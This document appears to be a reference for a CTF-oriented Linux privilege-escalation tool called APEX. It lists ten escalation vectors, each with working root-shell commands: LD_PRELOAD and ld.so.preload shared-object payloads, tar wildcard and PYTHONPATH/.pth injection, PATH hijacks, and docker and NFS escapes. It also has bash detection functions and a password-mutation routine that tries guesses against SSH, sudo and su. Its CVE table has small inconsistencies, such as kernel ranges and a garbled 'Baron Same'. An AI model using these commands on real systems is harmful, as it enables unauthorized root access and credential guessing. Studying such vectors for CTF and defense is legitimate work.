# APEX — Every PrivEsc Vector With Every Trap
## Complete Reference: What To Find, How Makers Hide It, How We Detect It

---

## VECTOR 1: Sudo NOPASSWD

### What It Is
User can run specific commands as root without password.
`sudo -l` reveals: `(ALL) NOPASSWD: /usr/bin/python3`

### Happy Path (What Students Expect)
```bash
sudo python3 -c "import os,pty; os.setuid(0); pty.spawn('/bin/bash')"
```

### Maker Traps — Every Known Variant

**Trap 1: env_reset hides LD_PRELOAD**
```bash
# sudo -l shows:
Defaults env_reset               ← resets environment before execution
Defaults env_keep += LD_PRELOAD  ← but THIS is preserved (students miss it)

# Exploit:
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
void __attribute__((constructor)) init() { setuid(0); system("/bin/bash -p"); }
EOF
gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
sudo LD_PRELOAD=/tmp/evil.so /any/nopasswd/command
```

**Trap 2: Script calls PATH-relative binary**
```bash
# sudo NOPASSWD: /opt/backup.sh
# Student looks at /opt/backup.sh: root:root -rwxr-xr-x (not writable)
# Student gives up.
# BUT backup.sh contains: cleanup   (no full path!)
# cleanup is looked up in PATH
# /usr/local/bin is writable (PATH is set in /etc/crontab or environment)
# Create /usr/local/bin/cleanup with payload
```

**Trap 3: sudo ALL with specific exceptions**
```bash
# sudo -l shows:
(ALL) ALL, !/bin/bash, !/bin/sh, !/bin/dash

# Student: "can't run bash. stuck."
# Reality: many bypasses exist
sudo /bin/bash -p      # -p flag often bypasses this
sudo /bin/vi           # then :!/bin/bash
sudo /usr/bin/python3 -c "import os; os.execl('/bin/bash','bash','-p')"
sudo /bin/find / -exec /bin/bash \;
```

**Trap 4: sudo with wildcard**
```bash
# sudo -l: (root) NOPASSWD: /bin/tar /home/user/*
# Student: "looks locked to specific path"
# Reality: wildcard expansion allows injection:
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=bash'
sudo /bin/tar /home/user/*
# tar expands wildcard, sees our filenames as flags
```

**Trap 5: sudo env_keep PYTHONPATH**
```bash
# Defaults env_keep += PYTHONPATH
# Student reads past this, looks only at commands

# Exploit:
mkdir /tmp/evil_lib
cat > /tmp/evil_lib/os.py << 'EOF'
import subprocess
subprocess.call(['/bin/bash', '-p'])
EOF
export PYTHONPATH=/tmp/evil_lib
sudo python3 /any/script.py   # imports our fake os module
```

**Trap 6: sudo on /usr/bin/env**
```bash
# sudo NOPASSWD: /usr/bin/env python3 /opt/safe.py
# Student: "locked to specific script"
# Reality: env finds python3 in PATH — if PATH has writable dir first:
mkdir /tmp/hijack
echo '#!/bin/bash' > /tmp/hijack/python3
echo 'chmod +s /bin/bash' >> /tmp/hijack/python3
chmod +x /tmp/hijack/python3
sudo PATH=/tmp/hijack:$PATH /usr/bin/env python3 /opt/safe.py
```

### APEX Detection Logic
```bash
detect_sudo() {
    local sudol=$(safe_run "sudo -n -l" 5)
    
    # Parse commands
    echo "$sudol" | grep "NOPASSWD" | grep -oE '/[^ ,]+' | while read cmd; do
        echo "[SUDO_NOPASSWD] $cmd"
        # Check env_keep
        echo "$sudol" | grep "env_keep" | grep -iE "LD_PRELOAD|PYTHONPATH|PERL5LIB" && \
            echo "  [CRITICAL] env_keep allows library injection"
        # Check if command is a script — read it
        [[ -f "$cmd" && ( "$cmd" == *.sh || "$cmd" == *.py ) ]] && \
            read_script_deeply "$cmd" 0 "sudo:$cmd"
        # Check for wildcards
        echo "$sudol" | grep -E '\*' && echo "  [WILDCARD] Wildcard injection possible"
        # Check for ALL with exceptions
        echo "$sudol" | grep -E 'ALL.*!' && echo "  [EXCEPTION_BYPASS] Check sudo version bypass"
    done
    
    # Full env_keep parsing
    echo "$sudol" | grep -E "env_keep|env_check" | while read line; do
        echo "[SUDO_ENV] $line"
        echo "$line" | grep -iE "LD_PRELOAD|LD_LIBRARY|PYTHONPATH|PERL5LIB|RUBY|NODE" && \
            echo "  [CRITICAL] Execution environment injectable via this variable"
    done
}
```

---

## VECTOR 2: SUID/SGID Binaries

### What It Is
Binary with SUID bit: runs as file owner (usually root) regardless of who executes it.

### Happy Path
```bash
find / -perm -4000 2>/dev/null   # find SUID
# Check against GTFOBins: https://gtfobins.github.io/
# e.g., /usr/bin/find → find . -exec /bin/sh -p \;
```

### Maker Traps

**Trap 1: Patched version — binary exists but exploit doesn't work**
```bash
# /usr/bin/vim has SUID. Student tries GTFOBins vim exploit.
# Fails. vim was compiled without vim-tiny setuid support.
# Or: vim version is patched specifically for this box.
# Time wasted: 45 minutes.
```
APEX counter: Check `debsums -c` — modified binary = different hash = custom.

**Trap 2: Capabilities instead of SUID (students never check)**
```bash
getcap -r / 2>/dev/null
# Returns: /usr/bin/python3 = cap_setuid+ep
# Student only checked find -perm -4000. Missed entirely.

# Exploit:
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

**Trap 3: SGID not SUID**
```bash
find / -perm -2000 2>/dev/null  # students forget SGID
# Binary with SGID shadow group → can read /etc/shadow
# Then crack hashes
```

**Trap 4: Custom SUID binary not in GTFOBins**
```bash
# /opt/syscheck has SUID bit
# Student: "not in GTFOBins, skip it"
# Reality: strings /opt/syscheck shows it calls system("clear")
# PATH hijack: create /tmp/clear with payload, prepend /tmp to PATH
PATH=/tmp:$PATH /opt/syscheck
```

**Trap 5: SUID binary calls another binary without full path**
```bash
# /usr/local/bin/admincheck (SUID root)
# strings output: "backup" appears without path
# Create /tmp/backup → PATH=/tmp:$PATH → run admincheck → backup runs as root
```

### APEX Detection Logic
```bash
detect_suid_sgid() {
    # Both SUID and SGID
    find / \( -perm -4000 -o -perm -2000 \) $FIND_MAXDEPTH 2>/dev/null | \
        while IFS= read -r binary; do
            local owner=$(apex_stat "$binary" owner)
            local perms=$(apex_stat "$binary" perms)
            echo "[SUID_FOUND] $binary (owner: $owner, perms: $perms)"
            
            # Is it a known GTFOBins candidate?
            check_gtfobins "$binary"
            
            # Read deeply for PATH-relative calls
            read_binary_deeply "$binary" "suid:$binary"
            
            # Is it a custom binary (not from package manager)?
            check_package_integrity "$binary"
        done
    
    # Capabilities (separate from SUID but same effect)
    apex_get_caps | grep -E "cap_setuid|cap_dac_override|cap_sys_admin" | \
        while IFS= read -r cap_line; do
            local cap_binary=$(echo "$cap_line" | awk '{print $1}')
            echo "[CAPABILITY] $cap_line"
            echo "  → Direct root equivalent. Exploit immediately."
            register_finding "CAPABILITY" "$cap_binary" "getcap" 95
        done
}
```

---

## VECTOR 3: Cron Jobs

### What It Is
Scheduled tasks running as root. If we can influence what they execute — root shell.

### Happy Path
```bash
cat /etc/crontab
# * * * * * root /opt/backup.sh
# /opt/backup.sh is writable → add payload → wait for execution
```

### Maker Traps

**Trap 1: PATH variable at top of crontab (MOST MISSED)**
```bash
# /etc/crontab:
SHELL=/bin/sh
PATH=/usr/local/bin:/usr/bin:/bin    ← STUDENTS NEVER READ THIS LINE

* * * * * root backup                ← students focus here

# /usr/local/bin is world-writable
# 'backup' doesn't exist anywhere
# Create /usr/local/bin/backup with payload → root runs it
```

**Trap 2: Script called by cron is not writable, but sources writable config**
```bash
# /etc/crontab: * * * * * root /usr/local/bin/monitor.sh
# monitor.sh: owned by root, not writable (student gives up)
# monitor.sh content: source /etc/monitor.conf  ← WRITABLE
# Inject payload into /etc/monitor.conf
```

**Trap 3: Wildcard injection via cron**
```bash
# cron: * * * * * root /bin/tar -czf /backup/home.tar.gz /home/user/*
# Create files with special names:
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=bash'
# When tar expands *, these become tar flags
```

**Trap 4: systemd timer instead of cron (students never check)**
```bash
systemctl list-timers --all
# Shows timer running every minute
# Unit file has writable EnvironmentFile or ExecStart script
```

**Trap 5: User crontab for another user (not just /etc/crontab)**
```bash
# /var/spool/cron/crontabs/www-data contains cron
# www-data process has capabilities or sudo
# Can we write files that www-data reads?
```

**Trap 6: Cron script evals its output**
```bash
# /etc/crontab: * * * * * root /opt/check.sh
# check.sh contains:
#   STATUS=$(/home/user/get_status.sh)
#   eval "$STATUS"                     ← WE CONTROL get_status.sh OUTPUT
# Our get_status.sh outputs: chmod +s /bin/bash
# eval executes it as root
```

### APEX Detection Logic
```bash
detect_cron() {
    local cron_content=""
    
    # Read ALL cron sources
    for cron_file in /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/*; do
        [[ -r "$cron_file" ]] && cron_content+=$(cat "$cron_file" 2>/dev/null)$'\n'
    done
    
    # CRITICAL: Parse PATH variable FIRST
    echo "$cron_content" | grep -E "^PATH=" | while IFS= read -r path_line; do
        echo "[CRON_PATH] $path_line"
        # Check each directory in PATH for writability
        local cron_path=$(echo "$path_line" | cut -d= -f2)
        IFS=: read -ra path_dirs <<< "$cron_path"
        for dir in "${path_dirs[@]}"; do
            [[ -w "$dir" ]] && {
                echo "[CRON_PATH_WRITABLE] $dir is writable AND in cron PATH"
                echo "  → Any command in cron without full path is hijackable"
                register_finding "CRON_PATH_HIJACK" "$dir" "/etc/crontab PATH" 92
            }
        done
    done
    
    # Parse cron commands
    echo "$cron_content" | grep -vE "^#|^$|^PATH|^SHELL|^MAILTO|^HOME" | \
        while IFS= read -r line; do
            # Extract the command (field 7+)
            local cmd=$(echo "$line" | awk '{for(i=7;i<=NF;i++) printf $i" "; print ""}' | xargs)
            local run_user=$(echo "$line" | awk '{print $6}')
            
            [[ -z "$cmd" ]] && continue
            echo "[CRON_JOB] user=$run_user cmd=$cmd"
            
            # Deep read the called script
            local script=$(echo "$cmd" | awk '{print $1}')
            read_script_deeply "$script" 0 "cron:$run_user → $script"
        done
    
    # Check systemd timers
    detect_systemd_timers
}

detect_systemd_timers() {
    [[ "$INIT" != "systemd" ]] && return
    
    systemctl list-timers --all --no-pager 2>/dev/null | \
        grep -v "^NEXT\|^--" | awk '{print $NF}' | while IFS= read -r service; do
            [[ "$service" == *.service ]] && read_unit_deeply "$service"
        done
}
```

---

## VECTOR 4: Writable Files in Privileged Execution Path

### What It Is
Root (or other privileged user/service) reads/executes a file we can write.

### Maker Traps

**Trap 1: File locked, directory writable (most students miss)**
```bash
ls -la /etc/app/config
-rw-r--r-- root root config   ← student: "not writable"

ls -la /etc/app/
drwxrwxrwx root root .        ← directory IS writable

# You cannot EDIT config but you CAN:
rm /etc/app/config && cp /etc/app/config.bak /etc/app/config && echo "payload" >> /etc/app/config
# OR: replace with symlink:
mv /etc/app/config /tmp/config.bak && ln -s /tmp/payload /etc/app/config
```

**Trap 2: Writable but not readable (blind write)**
```bash
ls -la /etc/ld.so.preload
--w------- root root /etc/ld.so.preload  ← writable, not readable

# Can still inject: echo "/tmp/evil.so" >> /etc/ld.so.preload
# Every binary on system loads /tmp/evil.so
```

**Trap 3: /etc/ld.so.preload (nuclear option)**
```bash
# If writable — GAME OVER. Every binary loads our library.
ls -la /etc/ld.so.preload

cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
void __attribute__((constructor)) init() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -nostartfiles -o /tmp/evil.so /tmp/evil.c
echo "/tmp/evil.so" >> /etc/ld.so.preload
su -  # or any other binary — our code runs first
```

**Trap 4: Python .pth file injection**
```bash
find / -name "*.pth" 2>/dev/null
# /usr/lib/python3/dist-packages/evil.pth

# If writable:
echo "import os; os.system('chmod +s /bin/bash')" > /usr/lib/python3/dist-packages/evil.pth
# OR:
echo "/tmp/mymodules" > /usr/lib/python3/dist-packages/path_inject.pth
# Next time ANY python3 script runs as root → our code executes
```

### APEX Detection
```bash
detect_writable_critical() {
    # /etc/ld.so.preload — highest priority
    if [[ -e /etc/ld.so.preload ]]; then
        if [[ -w /etc/ld.so.preload ]]; then
            echo "[CRITICAL] /etc/ld.so.preload is WRITABLE"
            echo "  Every binary loads this library. Instant root."
            register_finding "LD_PRELOAD_WRITABLE" "/etc/ld.so.preload" "global" 99
        elif [[ -w $(dirname /etc/ld.so.preload) ]]; then
            echo "[CRITICAL] /etc can be written to — can REPLACE ld.so.preload"
            register_finding "LD_PRELOAD_REPLACE" "/etc" "global" 95
        fi
    else
        # Doesn't exist — can we CREATE it?
        [[ -w /etc ]] && {
            echo "[CRITICAL] /etc writable — can CREATE /etc/ld.so.preload"
            register_finding "LD_PRELOAD_CREATE" "/etc" "global" 98
        }
    fi
    
    # .pth files
    find / -name "*.pth" 2>/dev/null | while IFS= read -r pth; do
        [[ -w "$pth" ]] && {
            echo "[PTH_WRITABLE] $pth — python auto-import injection"
            register_finding "PTH_INJECT" "$pth" "python_path" 85
        }
    done
    
    # Check parent directories of all non-writable files in execution graph
    while IFS= read -r exec_item; do
        [[ -f "$exec_item" && ! -w "$exec_item" ]] && {
            local parent=$(dirname "$exec_item")
            [[ -w "$parent" ]] && {
                echo "[DIR_REPLACE] $exec_item not writable BUT parent $parent IS"
                echo "  → Can delete and replace file entirely"
                register_finding "DIR_REPLACE" "$exec_item" "parent_dir_writable" 85
            }
        }
    done < "$APEX_TMP/execution_graph"
}
```

---

## VECTOR 5: NFS no_root_squash

### What It Is
NFS share mounted with no_root_squash means remote root = local root.
From attacker machine: mount the share, create SUID binary as root, execute on target.

### Maker Traps

**Trap 1: Export exists but squash is default**
```bash
# /etc/exports:
/share *(rw,sync,root_squash)  ← default — root on attacker ≠ root on target
# Student: "squash enabled, skip"
# But: one export has no_root_squash on specific IP
/backup 10.10.10.0/24(rw,no_root_squash)  ← only specific subnet
```

**Trap 2: Students never check /etc/exports**
Most students NEVER look at NFS exports. CTF makers know this.

### APEX Detection
```bash
detect_nfs() {
    local exports=$(safe_run "cat /etc/exports" 5)
    [[ -z "$exports" ]] && return
    
    echo "[NFS_EXPORTS_FOUND]"
    echo "$exports"
    
    echo "$exports" | grep -i "no_root_squash" | while IFS= read -r line; do
        echo "[CRITICAL_NFS] no_root_squash found: $line"
        echo "  From attacker machine:"
        echo "  mkdir /tmp/nfs && mount -t nfs TARGET:$(echo $line | awk '{print $1}') /tmp/nfs"
        echo "  cp /bin/bash /tmp/nfs/ && chmod +s /tmp/nfs/bash"
        echo "  On target: /path/to/mounted/bash -p"
        register_finding "NFS_NO_ROOT_SQUASH" "$line" "/etc/exports" 95
    done
}
```

---

## VECTOR 6: Group Membership Escalation

### What It Is
Membership in certain Linux groups grants access to privileged resources.

### Complete Group Escalation Matrix

| Group | What It Allows | Escalation Method |
|-------|---------------|-------------------|
| docker | Full root via container | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| lxd/lxc | Full root via container | Initialize image, mount /, chroot |
| disk | Raw disk read/write | `debugfs /dev/sda1` — read any file |
| shadow | Read /etc/shadow | Crack root hash |
| video | Screen capture | May capture passwords typed on screen |
| adm | Read /var/log | Find credentials in logs |
| sudo | Sudo access | Already covered |
| wheel | Sudo access (RHEL) | Already covered |
| kmem | Read kernel memory | Advanced — read memory for credentials |
| tape | Raw device access | Read backup tapes |
| audio | Audio device access | Usually low value |
| bluetooth | Bluetooth access | Usually low value |
| floppy | Floppy device | Usually low value |

### Maker Traps

**Trap 1: lxd vs docker (different exploit)**
```bash
# Student: "I'm in docker group! Use docker exploit!"
# Reality: user is in LXD group, not docker group
# Different exploit entirely
id | grep lxd  # check specifically
```

**Trap 2: disk group requires knowing device**
```bash
# Student: "what device is / on?"
df /  # shows /dev/sda1
debugfs /dev/sda1
debugfs: cat /etc/shadow  # read any file bypassing permissions
```

### APEX Detection
```bash
detect_group_escalation() {
    local groups=$(id 2>/dev/null)
    
    # High-value groups
    echo "$groups" | grep -oE '\([a-z0-9_-]+\)' | tr -d '()' | \
        while IFS= read -r group; do
            case "$group" in
                docker)
                    echo "[GROUP_DOCKER] User in docker group — full root available"
                    echo "  Exploit: docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
                    register_finding "GROUP_DOCKER" "$group" "id" 98
                    ;;
                lxd|lxc)
                    echo "[GROUP_LXD] User in $group group — container escape to root"
                    register_finding "GROUP_LXD" "$group" "id" 95
                    ;;
                disk)
                    local disk_dev=$(df / 2>/dev/null | tail -1 | awk '{print $1}')
                    echo "[GROUP_DISK] User in disk group — raw disk access"
                    echo "  Exploit: debugfs $disk_dev → cat /etc/shadow"
                    register_finding "GROUP_DISK" "$group" "id" 90
                    ;;
                shadow)
                    echo "[GROUP_SHADOW] User can read /etc/shadow — crack root hash"
                    register_finding "GROUP_SHADOW" "$group" "id" 85
                    ;;
                adm)
                    echo "[GROUP_ADM] Read /var/log — mine for credentials"
                    ;;
            esac
        done
}
```

---

## VECTOR 7: Root Calls Our Binary

### What It Is
Root process executes, reads from, or acts on a file/binary we own.

### ALL Known Variants

**Variant 1: Direct execution (obvious)**
```bash
# Cron: * * * * * root /home/user/backup.sh
# We own /home/user/backup.sh → write payload → done
```

**Variant 2: Root evals our output**
```bash
# Root's script:
STATUS=$( /home/user/get_status.sh )
eval "$STATUS"   ← GAME OVER
# Our script outputs: chmod +s /bin/bash
```

**Variant 3: Root pipes our output to sh**
```bash
# Root's script:
/home/user/generate_config.sh | bash
/home/user/setup.sh | sh
# Our script outputs arbitrary bash commands
```

**Variant 4: Root writes our output to privileged file**
```bash
# Root's script:
/home/user/report.py >> /etc/sudoers
/home/user/check.sh > /etc/cron.d/jobs
/home/user/gen.sh > /etc/passwd
# Our script outputs whatever we want into privileged file
```

**Variant 5: Root checks our exit code and acts on it**
```bash
# Root's script:
if /home/user/validate.sh; then
    chmod 777 /etc/shadow    ← runs if we exit 0
    useradd -G sudo attacker ← or this
fi
# We ensure exit code 0 → privilege granted
```

**Variant 6: Root imports our module**
```bash
# Root runs: python3 /opt/safe_script.py
# safe_script.py: import utils
# utils.py exists in our writable path
# OR: .pth file auto-imports our module
```

**Variant 7: Root sources our config/env file**
```bash
# Root's script starts with:
source /home/user/.env
# OR:
. /etc/app/user.conf   ← we can write this
```

**Variant 8: argv[0] behavior change**
```bash
# Some binaries behave differently based on their invocation name
# Root calls our binary as "sh" or "bash"
# Binary detects name and spawns shell
```

### APEX Detection (pspy Correlation)
```bash
analyze_pspy_output() {
    local pspy_output="$1"
    local current_user=$(whoami)
    local current_home="$HOME"
    
    # Find all root processes that reference our user/home
    echo "$pspy_output" | grep "UID=0" | \
        grep -E "$current_user|$current_home|$(id -u)" | \
        while IFS= read -r line; do
            echo "[ROOT_CALLS_US] $line"
            
            # Extract the script/binary being called
            local called=$(echo "$line" | grep -oE '/[^ ]+' | head -1)
            
            # Look at NEXT 5 lines in pspy for what root does after
            local line_num=$(grep -n "$line" <<< "$pspy_output" | cut -d: -f1 | head -1)
            local context=$(echo "$pspy_output" | sed -n "$((line_num+1)),$((line_num+5))p")
            
            # Check for dangerous post-execution patterns
            echo "$context" | grep -iE "eval|bash|sh |exec|chmod|useradd" && {
                echo "  [CRITICAL] Root does something dangerous after calling us"
                echo "  Context: $context"
                register_finding "ROOT_EVAL_OUTPUT" "$called" "pspy_correlation" 90
            }
            
            # Check for output redirection to privileged files
            echo "$context" | grep -E ">> /etc|> /etc|>> /root|> /root" && {
                echo "  [CRITICAL] Root writes our output to privileged location"
                register_finding "ROOT_OUTPUT_INJECT" "$called" "pspy_correlation" 92
            }
        done
    
    # Also: find root scripts that reference our home in their content
    find /etc /opt /usr/local -name "*.sh" -o -name "*.py" 2>/dev/null | \
        xargs grep -l "$current_user\|$current_home" 2>/dev/null | \
        while IFS= read -r script; do
            echo "[SCRIPT_REFERENCES_US] $script"
            # Read it and check for eval/source/pipe patterns
            grep -E "eval|source|\| bash|\| sh|>> /etc" "$script" 2>/dev/null && \
                echo "  [HIGH_SIGNAL] Script uses dangerous eval/source with our files"
        done
}
```

---

## VECTOR 8: Injected/Trojanized Binaries

### What It Is
Maker modified a legitimate binary (same path, different behavior).

### Detection: The Three Unfakeable Methods

**Method 1: Package Manager Integrity Check**
```bash
# Debian/Ubuntu:
debsums -c 2>/dev/null        # shows files with wrong checksums
# Any "FAILED" = modified binary = CUSTOM = your path

# RHEL/CentOS:
rpm -Va 2>/dev/null           # shows altered files
# "..5....." = hash mismatch

# Alpine (no package integrity tool):
# Fall back to method 2
```

**Method 2: Filesystem Timeline**
```bash
# Files newer than PID 1 (systemd) = added after boot = custom
find / -newer /proc/1/exe \
    -not -path "*/proc/*" \
    -not -path "*/sys/*" \
    -not -path "*/dev/*" \
    -not -path "/run/*" \
    -not -path "*/tmp/*" \
    -ls 2>/dev/null | head -100
```

**Method 3: Behavioral Analysis**
```bash
# Compare binary behavior to expectations
strings /usr/bin/python3 | grep -E "evil|payload|backdoor|reverse"
ldd /usr/bin/python3 | grep -v "standard_lib_paths"
# Non-standard .so dependency = injection point
```

**Maker Counter-Trick: Fake timestamps**
```bash
touch -t 202001010000 /usr/bin/python3  # maker resets timestamp
# Method 2 fails.
# But: debsums/rpm -Va CANNOT be fooled this way (hash in package DB)
# Unless: maker also modified the package database (rare, detectable)
```

### APEX Detection
```bash
detect_integrity() {
    case "$PKG" in
        dpkg)
            echo "[INTEGRITY] Running debsums check..."
            safe_run "debsums -c" 60 | grep "FAILED" | while IFS= read -r line; do
                echo "[MODIFIED_BINARY] $line"
                register_finding "MODIFIED_BINARY" "$line" "debsums" 80
            done
            ;;
        rpm)
            echo "[INTEGRITY] Running rpm -Va check..."
            safe_run "rpm -Va" 60 | grep "^..5" | while IFS= read -r line; do
                echo "[MODIFIED_BINARY] $line"
                register_finding "MODIFIED_BINARY" "$line" "rpm_verify" 80
            done
            ;;
        *)
            echo "[INTEGRITY] No package manager integrity tool available"
            echo "[INTEGRITY] Using timeline analysis..."
            ;;
    esac
    
    # Timeline check (fallback or additional)
    find / -newer /proc/1/exe \
        -not -path "*/proc/*" -not -path "*/sys/*" \
        -not -path "*/dev/*"  -not -path "/run/*" \
        -not -path "*/tmp/*"  -not -path "*/var/log/*" \
        -not -path "*/var/cache/*" \
        $FIND_MAXDEPTH 2>/dev/null | \
        while IFS= read -r newfile; do
            local owner=$(apex_stat "$newfile" owner)
            echo "[TIMELINE] New file: $newfile (owner: $owner)"
        done
}
```

---

## VECTOR 9: Credential Reuse (Credential DNA)

### What It Is
First found credential is a TEMPLATE. Most students find it and stop.
The credential pattern propagates across services.

### The Credential DNA Algorithm

```bash
propagate_credential() {
    local username="$1"
    local password="$2"
    local machine_name=$(hostname 2>/dev/null | tr '[:upper:]' '[:lower:]')
    
    # Generate mutations
    local mutations=()
    mutations+=("$password")                    # original
    mutations+=("${password^}")                 # Capitalize first
    mutations+=("${password^^}")                # ALL CAPS
    mutations+=("${password,,}")                # all lower
    mutations+=("${password}1")                 # append 1
    mutations+=("${password}123")               # append 123
    mutations+=("${password}!")                 # append !
    mutations+=("${password}2024")              # append year
    mutations+=("${password}2023")
    mutations+=("${machine_name}")              # machine name
    mutations+=("${machine_name^}")             # Machine name
    mutations+=("${machine_name}123")           # machine123
    mutations+=("${machine_name}!")             # machine!
    # Leet speak
    local leet="${password//a/4}"; leet="${leet//e/3}"; leet="${leet//i/1}"; leet="${leet//o/0}"
    mutations+=("$leet")
    
    echo "[CREDENTIAL_DNA] Propagating: $username:$password"
    echo "[CREDENTIAL_DNA] Generated ${#mutations[@]} mutations"
    
    # Try all mutations on all services
    for mutation in "${mutations[@]}"; do
        # SSH
        safe_run "sshpass -p '$mutation' ssh -o StrictHostKeyChecking=no \
            -o ConnectTimeout=3 $username@localhost 'id'" 5 | \
            grep -q "uid=0" && {
                echo "[CRED_MATCH] SSH root: $username:$mutation"
                register_finding "CRED_SSH_ROOT" "$mutation" "credential_dna" 99
            }
        
        # Sudo
        echo "$mutation" | safe_run "sudo -S -l" 5 | grep -q "NOPASSWD\|ALL" && {
            echo "[CRED_MATCH] Sudo works: $username:$mutation"
            register_finding "CRED_SUDO" "$mutation" "credential_dna" 95
        }
        
        # su to root
        echo "$mutation" | safe_run "su -c 'id' root" 5 | grep -q "uid=0" && {
            echo "[CRED_MATCH] Root password: $mutation"
            register_finding "CRED_ROOT_PASSWORD" "$mutation" "credential_dna" 99
        }
    done
}
```

---

## VECTOR 10: Kernel Exploits

### What It Is
Vulnerability in kernel allows privilege escalation from any user.

### Maker Traps

**Trap 1: Version shows vulnerable but patch applied**
```bash
uname -r  → 4.15.0-45-generic
# DirtyCow CVE-2016-5195 affects 4.15 → student compiles exploit
# Exploit fails — kernel patched, version number unchanged
# Time wasted: 2 hours

# APEX check:
grep -i "dirty\|cow\|CVE-2016" /proc/version_signature 2>/dev/null
cat /proc/sys/kernel/dirtycow* 2>/dev/null  # mitigation indicator
```

**Trap 2: No GCC to compile exploit**
```bash
# Kernel exploit requires compilation
# gcc not installed → student stuck
# APEX counter: pre-compile on attacker, transfer via base64
```

**Trap 3: Wrong architecture**
```bash
uname -m → x86_64  # target
# Student downloads x86 exploit binary
# Doesn't work
# Check arch before suggesting exploits
```

### Key Kernel CVEs By Kernel Version

| CVE | Kernel Range | Type | Notes |
|-----|-------------|------|-------|
| CVE-2016-5195 (DirtyCow) | < 4.8.3 | WRITE primitive | Most reliable |
| CVE-2021-4034 (PwnKit) | pkexec < 0.105 | SUID exploit | Userspace, very reliable |
| CVE-2022-0847 (Dirty Pipe) | 5.8 - 5.16.11 | WRITE primitive | Very reliable |
| CVE-2017-1000112 | 4.4 - 4.13 | UFO memory corruption | |
| CVE-2021-3156 (Baron Same) | sudo < 1.9.5p2 | heap overflow | |

### APEX Detection
```bash
detect_kernel_cves() {
    local kernel_ver=$(uname -r)
    local kernel_major=$(echo $kernel_ver | cut -d. -f1)
    local kernel_minor=$(echo $kernel_ver | cut -d. -f2)
    local arch=$(uname -m)
    
    echo "[KERNEL] Version: $kernel_ver ($arch)"
    
    # Check each known CVE
    # PwnKit (polkit) — check polkit version, not kernel
    if command -v pkexec >/dev/null 2>&1; then
        local pkexec_ver=$(pkexec --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+')
        echo "[PKEXEC] Version: $pkexec_ver"
        # Version < 0.105 vulnerable
    fi
    
    # sudo version check (Baron Samedit)
    local sudo_ver=$(sudo --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9p]+')
    echo "[SUDO] Version: $sudo_ver"
    
    # DirtyCow
    [[ $kernel_major -eq 4 && $kernel_minor -lt 8 ]] && \
        echo "[POSSIBLE_CVE] DirtyCow (CVE-2016-5195) — kernel $kernel_ver may be vulnerable"
    
    # Dirty Pipe
    [[ $kernel_major -eq 5 ]] && \
    [[ $kernel_minor -ge 8 && $kernel_minor -le 16 ]] && \
        echo "[POSSIBLE_CVE] Dirty Pipe (CVE-2022-0847) — kernel $kernel_ver in vulnerable range"
        
    echo "[NOTE] Always verify patch status — version number ≠ patch status"
    echo "[NOTE] Use: grep -i 'CVE' /proc/version_signature /proc/version 2>/dev/null"
}
```
